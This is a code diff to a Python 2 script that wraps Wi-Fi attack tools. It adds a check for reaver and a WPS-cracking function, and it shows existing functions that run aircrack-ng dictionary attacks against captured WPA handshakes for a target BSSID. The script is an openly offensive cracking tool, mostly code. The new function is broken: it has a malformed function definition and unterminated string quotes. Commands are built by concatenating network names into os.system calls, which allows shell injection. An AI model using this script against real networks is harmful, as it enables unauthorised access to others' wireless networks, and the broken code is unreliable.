@@ -20,6 +20,10 @@ if not os.path.exists('/usr/bin/aircrack-ng'):
 if not os.path.exists('/usr/bin/macchanger'):
 	print "macchanger is not installed."
 	sys.exit(1)
+	
+if not os.path.exists('/usr/bin/reaver'):
+	print "reaver is not installed. Please install reaver to use wps cracking"
+	
 
 
 
@@ -98,6 +102,11 @@ def WPA_PSK():
    os.system("gnome-terminal -x aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
    #wpa = open(bssid+'wpass.tkc')
    #print wpa.readlines("The wpa password is: ")
+  
+def WPS_Crack:
+   print "reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid+"
+   os.system("gnome-terminal -x reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid+")
+   
 def aircrack():
    print "aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc"
    os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc")
